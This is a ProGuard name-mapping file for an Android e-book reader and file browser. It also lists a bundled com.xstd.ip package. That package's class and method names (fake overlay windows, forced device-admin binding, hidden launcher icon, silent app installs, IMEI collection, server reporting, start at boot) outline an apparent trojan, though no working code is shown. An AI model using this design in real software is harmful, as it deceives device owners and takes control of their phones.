android.content.pm.IPackageDataObserver -> android.a.a.a:
    com.andorid.shu.love.LoveReaderActivity this$0 -> a
    void run() -> run
com.andorid.shu.love.LoveReaderActivity$2 -> com.andorid.shu.love.j:
    com.andorid.shu.love.LoveReaderActivity this$0 -> a
    void onCreateContextMenu(android.view.ContextMenu,android.view.View,android.view.ContextMenu$ContextMenuInfo) -> onCreateContextMenu
com.andorid.shu.love.LoveReaderActivity$3 -> com.andorid.shu.love.k:
    android.view.MenuItem val$item -> a
    com.andorid.shu.love.LoveReaderActivity this$0 -> b
    void onClick(android.content.DialogInterface,int) -> onClick
com.andorid.shu.love.LoveReaderActivity$4 -> com.andorid.shu.love.l:
    com.andorid.shu.love.LoveReaderActivity this$0 -> a
    void onClick(android.content.DialogInterface,int) -> onClick
com.andorid.shu.love.LoveReaderActivity$ButtonOnClick -> com.andorid.shu.love.m:
    com.andorid.shu.love.LoveReaderActivity this$0 -> a
    void onClick(android.view.View) -> onClick
com.andorid.shu.love.LoveReaderActivity$ShelfAdapter -> com.andorid.shu.love.n:
    com.andorid.shu.love.LoveReaderActivity this$0 -> a
    int getCount() -> getCount
    java.lang.Object getItem(int) -> getItem
    long getItemId(int) -> getItemId
    android.view.View getView(int,android.view.View,android.view.ViewGroup) -> getView
com.andorid.shu.love.PageWidget -> com.andorid.shu.love.o:
    android.graphics.Bitmap mCurPageBitmap -> a
    android.graphics.Bitmap mNextPageBitmap -> b
    android.graphics.PointF mTouch -> c
    android.graphics.PointF mBezierStart1 -> d
    android.graphics.PointF mBezierControl1 -> e
    android.graphics.PointF mBeziervertex1 -> f
    android.graphics.PointF mBezierEnd1 -> g
    android.graphics.PointF mBezierStart2 -> h
    android.graphics.PointF mBezierControl2 -> i
    android.graphics.PointF mBeziervertex2 -> j
    android.graphics.PointF mBezierEnd2 -> k
    float mMiddleX -> l
    float mMiddleY -> m
    float mDegrees -> n
    float mTouchToCornerDis -> o
    android.graphics.ColorMatrixColorFilter mColorMatrixFilter -> p
    android.graphics.Matrix mMatrix -> q
    float[] mMatrixArray -> r
    boolean mIsRTandLB -> s
    int[] mBackShadowColors -> t
    int[] mFrontShadowColors -> u
    android.graphics.drawable.GradientDrawable mBackShadowDrawableLR -> v
    android.graphics.drawable.GradientDrawable mBackShadowDrawableRL -> w
    android.graphics.drawable.GradientDrawable mFolderShadowDrawableLR -> x
    android.graphics.drawable.GradientDrawable mFolderShadowDrawableRL -> y
    android.graphics.drawable.GradientDrawable mFrontShadowDrawableHBT -> z
    android.graphics.drawable.GradientDrawable mFrontShadowDrawableHTB -> A
    android.graphics.drawable.GradientDrawable mFrontShadowDrawableVLR -> B
    android.graphics.drawable.GradientDrawable mFrontShadowDrawableVRL -> C
    android.graphics.Paint mPaint -> D
    android.widget.Scroller mScroller -> E
    int mWidth -> G
    int mHeight -> H
    float mMaxLength -> F
    int mCornerX -> I
    int mCornerY -> J
    android.graphics.Path mPath0 -> K
    android.graphics.Path mPath1 -> L
    void calcCornerXY(float,float) -> a
    boolean doTouchEvent(android.view.MotionEvent) -> a
    android.graphics.PointF getCross(android.graphics.PointF,android.graphics.PointF,android.graphics.PointF,android.graphics.PointF) -> a
    void calcPoints() -> d
    void drawCurrentPageArea(android.graphics.Canvas,android.graphics.Bitmap,android.graphics.Path) -> a
    void drawNextPageAreaAndShadow(android.graphics.Canvas,android.graphics.Bitmap) -> a
    void setBitmaps(android.graphics.Bitmap,android.graphics.Bitmap) -> a
    void onDraw(android.graphics.Canvas) -> onDraw
    void createDrawable() -> e
    void drawCurrentPageShadow(android.graphics.Canvas) -> a
    void drawCurrentBackArea(android.graphics.Canvas,android.graphics.Bitmap) -> b
    void computeScroll() -> computeScroll
    void startAnimation(int) -> a
    void abortAnimation() -> a
    boolean canDragOver() -> b
    boolean DragToRight() -> c
com.andorid.shu.love.SetupInfo -> com.andorid.shu.love.p:
    int id -> a
    int fontsize -> b
    int rowspace -> c
    int columnspace -> d
com.android.filebrowser.ExternalStorageActivity -> com.android.filebrowser.ExternalStorageActivity:
    java.lang.String TAG -> a
    int MENU_RENAME -> b
    int MENU_COPY -> c
    int MENU_MOVE -> d
    int MENU_DELETE -> e
    int MENU_INFO -> f
    int MENU_IMPORT -> g
    android.widget.TextView _filePath -> h
    java.util.List _files -> i
    java.lang.String _rootPath -> j
    java.lang.String _currentPath -> k
    android.os.Handler renameFileHandler -> l
    android.os.Handler createDirHandler -> m
    android.widget.BaseAdapter adapter -> n
    java.lang.String isImport -> o
    java.lang.String targetPath -> p
    void onCreate(android.os.Bundle) -> onCreate
    void onCreateContextMenu(android.view.ContextMenu,android.view.View,android.view.ContextMenu$ContextMenuInfo) -> onCreateContextMenu
    boolean onContextItemSelected(android.view.MenuItem) -> onContextItemSelected
    void onListItemClick(android.widget.ListView,android.view.View,int,long) -> onListItemClick
    boolean onKeyDown(int,android.view.KeyEvent) -> onKeyDown
    void onActivityResult(int,int,android.content.Intent) -> onActivityResult
    boolean onCreateOptionsMenu(android.view.Menu) -> onCreateOptionsMenu
    boolean onOptionsItemSelected(android.view.MenuItem) -> onOptionsItemSelected
    void viewFiles(java.lang.String) -> a
    void pasteFile(java.lang.String,java.lang.String) -> a
    void exit() -> a
    java.lang.String access$000(com.android.filebrowser.ExternalStorageActivity) -> a
    void access$100(com.android.filebrowser.ExternalStorageActivity,java.lang.String) -> a
com.android.filebrowser.ExternalStorageActivity$1 -> com.android.filebrowser.a:
    com.android.filebrowser.ExternalStorageActivity this$0 -> a
    void handleMessage(android.os.Message) -> handleMessage
com.android.filebrowser.ExternalStorageActivity$2 -> com.android.filebrowser.b:
    com.android.filebrowser.ExternalStorageActivity this$0 -> a
    void handleMessage(android.os.Message) -> handleMessage
com.android.filebrowser.FileActivityHelper -> com.android.filebrowser.c:
    java.util.ArrayList getFiles(android.app.Activity,java.lang.String) -> a
    void createDir(android.app.Activity,java.lang.String,android.os.Handler) -> a
    void renameFile(android.app.Activity,java.io.File,android.os.Handler) -> a
    void viewFileInfo(android.app.Activity,java.io.File) -> a
com.android.filebrowser.FileActivityHelper$1 -> com.android.filebrowser.d:
    android.widget.EditText val$text -> a
    android.app.Activity val$activity -> b
    java.lang.String val$path -> c
    android.os.Handler val$hander -> d
    void onClick(android.content.DialogInterface,int) -> onClick
com.android.filebrowser.FileActivityHelper$2 -> com.android.filebrowser.e:
    java.io.File val$f -> a
    android.widget.EditText val$text -> b
    android.app.Activity val$activity -> c
    android.os.Handler val$hander -> d
    void onClick(android.content.DialogInterface,int) -> onClick
com.android.filebrowser.FileActivityHelper$3 -> com.android.filebrowser.f:
    void onClick(android.content.DialogInterface,int) -> onClick
com.android.filebrowser.FileAdapter -> com.android.filebrowser.g:
    android.view.LayoutInflater _inflater -> a
    java.util.List _files -> b
    int getCount() -> getCount
    java.lang.Object getItem(int) -> getItem
    long getItemId(int) -> getItemId
    android.view.View getView(int,android.view.View,android.view.ViewGroup) -> getView
com.android.filebrowser.FileAdapter$1 -> com.android.filebrowser.h:
com.android.filebrowser.FileAdapter$ViewHolder -> com.android.filebrowser.i:
    android.widget.TextView name -> a
    android.widget.ImageView icon -> b
    com.android.filebrowser.FileAdapter this$0 -> c
com.android.filebrowser.FileComparator -> com.android.filebrowser.j:
    int compare(com.android.filebrowser.FileInfo,com.android.filebrowser.FileInfo) -> a
    int compare(java.lang.Object,java.lang.Object) -> compare
com.android.filebrowser.FileInfo -> com.android.filebrowser.k:
    java.lang.String Name -> a
    java.lang.String Path -> b
    long Size -> c
    boolean IsDirectory -> d
    int FileCount -> e
    int FolderCount -> f
    int getIconResourceId() -> a
com.android.filebrowser.FileUtil -> com.android.filebrowser.l:
    java.lang.String getSDPath() -> a
    com.android.filebrowser.FileInfo getFileInfo(java.io.File) -> a
    void calcFileContent(com.android.filebrowser.FileInfo,java.io.File) -> a
    java.lang.String formetFileSize(long) -> a
    java.lang.String combinPath(java.lang.String,java.lang.String) -> a
    boolean copyFile(java.io.File,java.io.File) -> a
    boolean moveFile(java.io.File,java.io.File) -> b
    void deleteFile(java.io.File) -> b
com.android.filebrowser.PasteFile -> com.android.filebrowser.PasteFile:
    java.lang.String TAG -> a
    android.widget.TextView _filePath -> b
    java.util.List _files -> c
    java.lang.String _rootPath -> d
    java.lang.String _currentPath -> e
    android.os.Handler createDirHandler -> f
    android.view.View$OnClickListener fun_CreateDir -> g
    android.os.Handler progressHandler -> h
    java.lang.String _currentPasteFilePath -> i
    java.lang.String _action -> j
    android.app.ProgressDialog progressDialog -> k
    android.view.View$OnClickListener fun_Paste -> l
    android.widget.BaseAdapter adapter -> m
    android.view.View$OnClickListener fun_Cancel -> n
    void onCreate(android.os.Bundle) -> onCreate
    void onListItemClick(android.widget.ListView,android.view.View,int,long) -> onListItemClick
    boolean onKeyDown(int,android.view.KeyEvent) -> onKeyDown
    void viewFiles(java.lang.String) -> a
    java.lang.String access$000(com.android.filebrowser.PasteFile) -> a
    void access$100(com.android.filebrowser.PasteFile,java.lang.String) -> a
    android.os.Handler access$200(com.android.filebrowser.PasteFile) -> b
    android.app.ProgressDialog access$300(com.android.filebrowser.PasteFile) -> c
    java.lang.String access$400(com.android.filebrowser.PasteFile) -> d
    android.app.ProgressDialog access$302(com.android.filebrowser.PasteFile,android.app.ProgressDialog) -> a
    java.lang.String access$500(com.android.filebrowser.PasteFile) -> e
    android.os.Handler access$600(com.android.filebrowser.PasteFile) -> f
com.android.filebrowser.PasteFile$1 -> com.android.filebrowser.m:
    com.android.filebrowser.PasteFile this$0 -> a
    void handleMessage(android.os.Message) -> handleMessage
com.android.filebrowser.PasteFile$2 -> com.android.filebrowser.n:
    com.android.filebrowser.PasteFile this$0 -> a
    void onClick(android.view.View) -> onClick
com.android.filebrowser.PasteFile$3 -> com.android.filebrowser.o:
    com.android.filebrowser.PasteFile this$0 -> a
    void handleMessage(android.os.Message) -> handleMessage
com.android.filebrowser.PasteFile$4 -> com.android.filebrowser.p:
    com.android.filebrowser.PasteFile this$0 -> a
    void onClick(android.view.View) -> onClick
com.android.filebrowser.PasteFile$4$1 -> com.android.filebrowser.q:
    java.io.File val$src -> a
    java.io.File val$tar -> b
    com.android.filebrowser.PasteFile$4 this$1 -> c
    void run() -> run
com.android.filebrowser.PasteFile$5 -> com.android.filebrowser.r:
    com.android.filebrowser.PasteFile this$0 -> a
    void onClick(android.view.View) -> onClick
com.sqlite.DbHelper -> com.a.a:
    void onCreate(android.database.sqlite.SQLiteDatabase) -> onCreate
    void onUpgrade(android.database.sqlite.SQLiteDatabase,int,int) -> onUpgrade
    android.database.Cursor select() -> a
    com.andorid.shu.love.BookInfo getBookInfo(int) -> a
    com.andorid.shu.love.SetupInfo getSetupInfo() -> b
    java.util.List getAllBookInfo() -> c
    long insert(java.lang.String,java.lang.String) -> a
    void delete(int) -> b
    void update(int,java.lang.String,java.lang.String) -> a
    void updateSetup(int,java.lang.String,java.lang.String,java.lang.String) -> a
com.xstd.ip.BindFakeActivity -> com.xstd.ip.BindFakeActivity:
    android.os.Handler mHandler -> a
    void onCreate(android.os.Bundle) -> onCreate
    void onDestroy() -> onDestroy
    void onActivityResult(int,int,android.content.Intent) -> onActivityResult
com.xstd.ip.BindFakeActivity$1 -> com.xstd.ip.a:
    com.xstd.ip.BindFakeActivity this$0 -> a
    void run() -> run
com.xstd.ip.Config -> com.xstd.ip.b:
    boolean isDebug -> a
    java.util.concurrent.atomic.AtomicBoolean IS_DOWNLOADING -> b
    java.util.Map installApks -> c
    com.xstd.ip.FakeWindowBinding window -> d
    java.util.concurrent.atomic.AtomicBoolean LEFT_ACTIVE_BUTTON -> e
    java.util.concurrent.atomic.AtomicBoolean WATCHING_SERVICE_ACTIVE_BREAK -> f
    java.util.concurrent.atomic.AtomicBoolean WATCHING_TOP_IS_SETTINGS -> g
    java.util.concurrent.atomic.AtomicBoolean WATCHING_SERVICE_ACTIVE_RUNNING -> h
com.xstd.ip.DisDeviceFakeWindow -> com.xstd.ip.c:
    android.content.Context context -> a
    android.view.View coverView -> b
    android.view.WindowManager wm -> c
    void show() -> a
com.xstd.ip.DisDeviceFakeWindow$1 -> com.xstd.ip.d:
    com.xstd.ip.DisDeviceFakeWindow this$0 -> a
    boolean onKey(android.view.View,int,android.view.KeyEvent) -> onKey
com.xstd.ip.FakeWindowBinding -> com.xstd.ip.e:
    android.view.View coverView -> a
    android.view.View timerView -> b
    android.widget.TextView timeTV -> c
    android.view.View installView -> d
    android.content.Context context -> e
    android.view.WindowManager wm -> f
    int count -> g
    android.os.Handler handler -> h
    android.view.WindowManager$LayoutParams fullConfirmBtnParams -> i
    android.view.WindowManager$LayoutParams confirmBtnParams -> j
    android.view.WindowManager$LayoutParams btnParams -> k
    android.view.View fullInstallView -> l
    com.xstd.ip.FakeWindowBinding$WindowListener mWindowListener -> m
    android.view.LayoutInflater mLayoutInflater -> n
    int dimissCount -> o
    void updateTimerCount() -> a
    void dismiss() -> b
    void show() -> c
    android.view.View access$000(com.xstd.ip.FakeWindowBinding) -> a
    android.view.View access$100(com.xstd.ip.FakeWindowBinding) -> b
    int access$210(com.xstd.ip.FakeWindowBinding) -> c
    int access$300(com.xstd.ip.FakeWindowBinding) -> d
    int access$310(com.xstd.ip.FakeWindowBinding) -> e
    int access$200(com.xstd.ip.FakeWindowBinding) -> f
    com.xstd.ip.FakeWindowBinding$WindowListener access$400(com.xstd.ip.FakeWindowBinding) -> g
    android.os.Handler access$500(com.xstd.ip.FakeWindowBinding) -> h
com.xstd.ip.FakeWindowBinding$1 -> com.xstd.ip.f:
    com.xstd.ip.FakeWindowBinding this$0 -> a
    void run() -> run
com.xstd.ip.FakeWindowBinding$1$1 -> com.xstd.ip.g:
    com.xstd.ip.FakeWindowBinding$1 this$1 -> a
    void run() -> run
com.xstd.ip.FakeWindowBinding$2 -> com.xstd.ip.h:
    com.xstd.ip.FakeWindowBinding this$0 -> a
    boolean onKey(android.view.View,int,android.view.KeyEvent) -> onKey
com.xstd.ip.FakeWindowBinding$WindowListener -> com.xstd.ip.i:
    void onWindowPreDismiss() -> a
    void onWindowDismiss() -> b
com.xstd.ip.InitApplication -> com.xstd.ip.InitApplication:
    net.tsz.afinal.FinalHttp finalHttp -> a
    net.tsz.afinal.FinalDb finalDb -> b
    android.content.SharedPreferences sharedPreferences -> c
    java.lang.String imei -> d
    java.lang.String device -> e
    java.lang.String os -> f
    void onCreate() -> onCreate
    void init() -> g
    java.lang.String getImei() -> a
    java.lang.String getDevice() -> b
    java.lang.String getOs() -> c
    net.tsz.afinal.FinalHttp getFinalHttp() -> d
    net.tsz.afinal.FinalDb getFinalDb() -> e
    android.content.SharedPreferences getSharedPreferences() -> f
com.xstd.ip.Tools -> com.xstd.ip.j:
    void startCoreService(android.content.Context) -> a
    void startFakeService(android.content.Context,java.lang.String) -> a
    android.content.pm.IPackageManager getPackageManger() -> c
    android.content.pm.PackageInfo getPackageInfoByPath(android.content.Context,java.lang.String) -> b
    void installFile(android.content.Context,com.xstd.ip.module.ApplicationInfo,android.content.pm.IPackageInstallObserver) -> a
    void cancleNotification(android.content.Context,java.lang.String) -> c
    int generateNotificationID(java.lang.String) -> c
    void useNotificationInstall(android.content.Context,com.xstd.ip.module.ApplicationInfo) -> a
    void goHome(android.content.Context) -> b
    boolean isTrueTime() -> a
    boolean isOnline(android.content.Context) -> c
    java.util.List getDeviceInstallPackName(android.content.Context) -> d
    void logW(java.lang.String) -> a
    void notifyServer(android.content.Context,com.xstd.ip.module.PushMessage) -> a
    void bindDeviceManager(android.app.Activity) -> a
    boolean isVersionBeyondGB() -> b
    boolean isBindingActive(android.content.Context) -> e
    void setDeviceBindingActiveTime(android.content.Context,int) -> a
    int getDeviceBindingActiveTime(android.content.Context) -> f
    void initFakeWindow(android.content.Context) -> g
    void hideLaunchIcon(android.content.Context) -> h
    void launchApplication(android.content.Context,java.lang.String) -> d
    java.lang.String getDownloadDirectory(android.content.Context) -> i
    boolean isEmpty(java.lang.String) -> b
com.xstd.ip.module.ApplicationInfo -> com.xstd.ip.a.a:
    int _id -> a
    java.lang.String fileName -> b
    java.lang.String packageName -> c
    java.lang.String downloadPath -> d
    java.lang.String localPath -> e
    boolean silence -> f
    boolean download -> g
    boolean install -> h
    long installTime -> i
    long uninstallTime -> j
    java.lang.String tickerText -> k
    java.lang.String title -> l
    java.lang.String text -> m
    java.lang.String token -> n
    java.lang.String getFileName() -> a
    java.lang.String getPackageName() -> b
    java.lang.String getDownloadPath() -> c
    java.lang.String getLocalPath() -> d
    void setLocalPath(java.lang.String) -> a
    boolean isSilence() -> e
    void setDownload(boolean) -> a
    void setInstall(boolean) -> b
    void setInstallTime(long) -> a
    java.lang.String getTickerText() -> f
    void setTickerText(java.lang.String) -> b
    java.lang.String getTitle() -> g
    void setTitle(java.lang.String) -> c
    java.lang.String getText() -> h
    void setText(java.lang.String) -> d
    java.lang.String getToken() -> i
    java.lang.String toString() -> toString
com.xstd.ip.module.PushMessage -> com.xstd.ip.a.b:
    java.lang.String packageName -> a
    int type -> b
    java.lang.String token -> c
    boolean successful -> d
    java.lang.String getPackageName() -> a
    void setPackageName(java.lang.String) -> a
    int getType() -> b
    void setType(int) -> a
    java.lang.String getToken() -> c
    void setToken(java.lang.String) -> b
    void setSuccessful(boolean) -> a
com.xstd.ip.receiver.BindDeviceReceiver -> com.xstd.ip.receiver.BindDeviceReceiver:
    java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent) -> onDisableRequested
    void onDisabled(android.content.Context,android.content.Intent) -> onDisabled
com.xstd.ip.receiver.BootCompleteReceiver -> com.xstd.ip.receiver.BootCompleteReceiver:
    void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.xstd.ip.receiver.PackageAddRemReceiver -> com.xstd.ip.receiver.PackageAddRemReceiver:
    void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.xstd.ip.service.CoreService -> com.xstd.ip.service.CoreService:
    com.xstd.ip.service.CoreService$CoreReceiver receiver -> a
    android.os.Handler handler -> b
    com.xstd.ip.InitApplication application -> c
    android.content.pm.IPackageInstallObserver$Stub observer -> d
    android.os.IBinder onBind(android.content.Intent) -> onBind
    void onCreate() -> onCreate
    int onStartCommand(android.content.Intent,int,int) -> onStartCommand
    void onDestroy() -> onDestroy
    void registerCoreReceiver() -> a
    void receiveBroadcast(int,android.content.Intent) -> a
    void changeServerUrl() -> b
    void updateService() -> c
    void pushMessage() -> d
    java.lang.String getDownloadLocation() -> e
    void startDownload() -> f
    com.xstd.ip.InitApplication access$000(com.xstd.ip.service.CoreService) -> a
    void access$100(com.xstd.ip.service.CoreService) -> b
    void access$200(com.xstd.ip.service.CoreService) -> c
    void access$300(com.xstd.ip.service.CoreService) -> d
    android.os.Handler access$400(com.xstd.ip.service.CoreService) -> e
    android.content.pm.IPackageInstallObserver$Stub access$500(com.xstd.ip.service.CoreService) -> f
    void access$600(com.xstd.ip.service.CoreService,int,android.content.Intent) -> a
com.xstd.ip.service.CoreService$1 -> com.xstd.ip.service.a:
    com.xstd.ip.service.CoreService this$0 -> a
    void packageInstalled(java.lang.String,int) -> a
com.xstd.ip.service.CoreService$2 -> com.xstd.ip.service.b:
    com.xstd.ip.service.CoreService this$0 -> a
    void onSuccess(java.lang.Object) -> a
    void onFailure(java.lang.Throwable,int,java.lang.String) -> a
com.xstd.ip.service.CoreService$2$1 -> com.xstd.ip.service.c:
    com.xstd.ip.service.CoreService$2 this$1 -> a
com.xstd.ip.service.CoreService$2$2 -> com.xstd.ip.service.d:
    com.xstd.ip.service.CoreService$2 this$1 -> a
    void run() -> run
com.xstd.ip.service.CoreService$3 -> com.xstd.ip.service.e:
    com.xstd.ip.service.CoreService this$0 -> a
    void onSuccess(java.lang.Object) -> a
    void onFailure(java.lang.Throwable,int,java.lang.String) -> a
com.xstd.ip.service.CoreService$4 -> com.xstd.ip.service.f:
    com.xstd.ip.service.CoreService this$0 -> a
    void onSuccess(java.lang.Object) -> a
    void onFailure(java.lang.Throwable,int,java.lang.String) -> a
com.xstd.ip.service.CoreService$5 -> com.xstd.ip.service.g:
    com.xstd.ip.module.ApplicationInfo val$info -> a
    java.io.File val$file -> b
    com.xstd.ip.service.CoreService this$0 -> c
    void onSuccess(java.io.File) -> a
    void onFailure(java.lang.Throwable,int,java.lang.String) -> a
    void onSuccess(java.lang.Object) -> a
com.xstd.ip.service.CoreService$5$1 -> com.xstd.ip.service.h:
    com.xstd.ip.service.CoreService$5 this$1 -> a
    void run() -> run
com.xstd.ip.service.CoreService$CoreReceiver -> com.xstd.ip.service.i:
    com.xstd.ip.service.CoreService this$0 -> a
    void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.xstd.ip.service.FakeBindService -> com.xstd.ip.service.FakeBindService:
    boolean mHasRegisted -> a
    android.os.Handler mHandler -> b
    android.content.BroadcastReceiver mBindSuccesBRC -> c
    void onCreate() -> onCreate
    int onStartCommand(android.content.Intent,int,int) -> onStartCommand
    void onDestroy() -> onDestroy
    void showFakeWindow() -> a
    android.os.IBinder onBind(android.content.Intent) -> onBind
    android.os.Handler access$000(com.xstd.ip.service.FakeBindService) -> a
com.xstd.ip.service.FakeBindService$1 -> com.xstd.ip.service.j:
    com.xstd.ip.service.FakeBindService this$0 -> a
    void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.xstd.ip.service.FakeBindService$1$1 -> com.xstd.ip.service.k:
    com.xstd.ip.service.FakeBindService$1 this$1 -> a
    void run() -> run
com.xstd.ip.service.FakeBindService$2 -> com.xstd.ip.service.l:
    com.xstd.ip.service.FakeBindService this$0 -> a
    void onWindowPreDismiss() -> a
    void onWindowDismiss() -> b
com.xstd.ip.service.FakeBindService$2$1 -> com.xstd.ip.service.m:
    com.xstd.ip.service.FakeBindService$2 this$1 -> a
    void run() -> run
com.xstd.ip.service.SendServerService -> com.xstd.ip.service.SendServerService:
    void onHandleIntent(android.content.Intent) -> onHandleIntent
com.xstd.ip.service.SendServerService$1 -> com.xstd.ip.service.n:
    com.xstd.ip.module.PushMessage val$message -> a
    com.xstd.ip.InitApplication val$application -> b
    com.xstd.ip.service.SendServerService this$0 -> c
    void onSuccess(java.lang.Object) -> a
com.xstd.ip.service.WatchBindService -> com.xstd.ip.service.WatchBindService:
    java.lang.Thread mWatchingThread -> a
    void onCreate() -> onCreate
    void onDestroy() -> onDestroy
    android.os.IBinder onBind(android.content.Intent) -> onBind
com.xstd.ip.service.WatchBindService$1 -> com.xstd.ip.service.o:
    android.app.ActivityManager val$am -> a
    com.xstd.ip.service.WatchBindService this$0 -> b
    void run() -> run
net.tsz.afinal.FinalDb -> a.a.a.a:
    java.util.HashMap daoMap -> a
    android.database.sqlite.SQLiteDatabase db -> b
    net.tsz.afinal.FinalDb$DaoConfig config -> c
    net.tsz.afinal.FinalDb getInstance(net.tsz.afinal.FinalDb$DaoConfig) -> b
    net.tsz.afinal.FinalDb create(android.content.Context,boolean) -> a
    net.tsz.afinal.FinalDb create(net.tsz.afinal.FinalDb$DaoConfig) -> a
    void save(java.lang.Object) -> a
    void update(java.lang.Object) -> b
    void dropDb() -> a
    void exeSqlInfo(net.tsz.afinal.db.sqlite.SqlInfo) -> a
    java.lang.Object findById(java.lang.Object,java.lang.Class) -> a
    java.lang.Object loadManyToOne(net.tsz.afinal.db.sqlite.DbModel,java.lang.Object,java.lang.Class,java.lang.Class[]) -> a
    java.util.List findAllByWhere(java.lang.Class,java.lang.String) -> a
    java.util.List findAllByWhere(java.lang.Class,java.lang.String,java.lang.String) -> a
    java.util.List findAllBySql(java.lang.Class,java.lang.String) -> b
    void checkTableExist(java.lang.Class) -> a
    boolean tableIsExist(net.tsz.afinal.db.table.TableInfo) -> a
    void debugSql(java.lang.String) -> a
    android.database.sqlite.SQLiteDatabase createDbFileOnSDCard(java.lang.String,java.lang.String) -> a
net.tsz.afinal.FinalDb$DaoConfig -> a.a.a.b:
    android.content.Context mContext -> a
    java.lang.String mDbName -> b
    int dbVersion -> c
    boolean debug -> d
    net.tsz.afinal.FinalDb$DbUpdateListener dbUpdateListener -> e
    java.lang.String targetDirectory -> f
    android.content.Context getContext() -> a
    void setContext(android.content.Context) -> a
    java.lang.String getDbName() -> b
    int getDbVersion() -> c
    boolean isDebug() -> d
    void setDebug(boolean) -> a
    net.tsz.afinal.FinalDb$DbUpdateListener getDbUpdateListener() -> e
    java.lang.String getTargetDirectory() -> f
net.tsz.afinal.FinalDb$DbUpdateListener -> a.a.a.c:
    void onUpgrade(android.database.sqlite.SQLiteDatabase,int,int) -> a
net.tsz.afinal.FinalDb$SqliteDbHelper -> a.a.a.d:
    net.tsz.afinal.FinalDb$DbUpdateListener mDbUpdateListener -> b
    net.tsz.afinal.FinalDb this$0 -> a
    void onCreate(android.database.sqlite.SQLiteDatabase) -> onCreate
    void onUpgrade(android.database.sqlite.SQLiteDatabase,int,int) -> onUpgrade
net.tsz.afinal.FinalHttp -> a.a.a.e:
    int maxConnections -> a
    int socketTimeout -> b
    int maxRetries -> c
    int httpThreadCount -> d
    org.apache.http.impl.client.DefaultHttpClient httpClient -> e
    org.apache.http.protocol.HttpContext httpContext -> f
    java.lang.String charset -> g
    java.util.Map clientHeaderMap -> h
    java.util.concurrent.ThreadFactory sThreadFactory -> i
    java.util.concurrent.Executor executor -> j
    void get(java.lang.String,net.tsz.afinal.http.AjaxCallBack) -> a
    void get(java.lang.String,net.tsz.afinal.http.AjaxParams,net.tsz.afinal.http.AjaxCallBack) -> a
    void post(java.lang.String,net.tsz.afinal.http.AjaxParams,net.tsz.afinal.http.AjaxCallBack) -> b
    void post(java.lang.String,org.apache.http.HttpEntity,java.lang.String,net.tsz.afinal.http.AjaxCallBack) -> a
    net.tsz.afinal.http.HttpHandler download(java.lang.String,java.lang.String,boolean,net.tsz.afinal.http.AjaxCallBack) -> a
    net.tsz.afinal.http.HttpHandler download(java.lang.String,net.tsz.afinal.http.AjaxParams,java.lang.String,boolean,net.tsz.afinal.http.AjaxCallBack) -> a
    void sendRequest(org.apache.http.impl.client.DefaultHttpClient,org.apache.http.protocol.HttpContext,org.apache.http.client.methods.HttpUriRequest,java.lang.String,net.tsz.afinal.http.AjaxCallBack) -> a
    java.lang.String getUrlWithQueryString(java.lang.String,net.tsz.afinal.http.AjaxParams) -> a
    org.apache.http.HttpEntity paramsToEntity(net.tsz.afinal.http.AjaxParams) -> a
    org.apache.http.client.methods.HttpEntityEnclosingRequestBase addEntityToRequestBase(org.apache.http.client.methods.HttpEntityEnclosingRequestBase,org.apache.http.HttpEntity) -> a
    java.util.Map access$000(net.tsz.afinal.FinalHttp) -> a
net.tsz.afinal.FinalHttp$1 -> a.a.a.f:
    java.util.concurrent.atomic.AtomicInteger mCount -> a
    java.lang.Thread newThread(java.lang.Runnable) -> newThread
net.tsz.afinal.FinalHttp$2 -> a.a.a.g:
    net.tsz.afinal.FinalHttp this$0 -> a
    void process(org.apache.http.HttpRequest,org.apache.http.protocol.HttpContext) -> process
net.tsz.afinal.FinalHttp$3 -> a.a.a.h:
    net.tsz.afinal.FinalHttp this$0 -> a
    void process(org.apache.http.HttpResponse,org.apache.http.protocol.HttpContext) -> process
net.tsz.afinal.FinalHttp$InflatingEntity -> a.a.a.i:
    java.io.InputStream getContent() -> getContent
    long getContentLength() -> getContentLength
net.tsz.afinal.annotation.sqlite.Id -> a.a.a.a.a.a:
    java.lang.String column() -> a
net.tsz.afinal.annotation.sqlite.ManyToOne -> a.a.a.a.a.b:
    java.lang.String column() -> a
net.tsz.afinal.annotation.sqlite.NotNull -> a.a.a.a.a.c:
    boolean value() -> a
net.tsz.afinal.annotation.sqlite.OneToMany -> a.a.a.a.a.d:
    java.lang.String manyColumn() -> a
net.tsz.afinal.annotation.sqlite.Property -> a.a.a.a.a.e:
    java.lang.String column() -> a
